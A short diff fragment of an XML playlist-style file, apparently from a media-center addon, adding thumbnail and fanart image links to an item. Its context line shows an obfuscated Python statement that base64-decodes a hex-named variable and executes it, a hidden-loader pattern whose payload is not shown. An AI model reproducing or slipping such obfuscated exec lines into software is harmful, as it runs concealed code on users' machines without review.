@@ -304,6 +304,8 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
+<thumbnail>https://i.imgur.com/0ZNTEXk.jpg</thumbnail>
+<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
 </item>
 
 
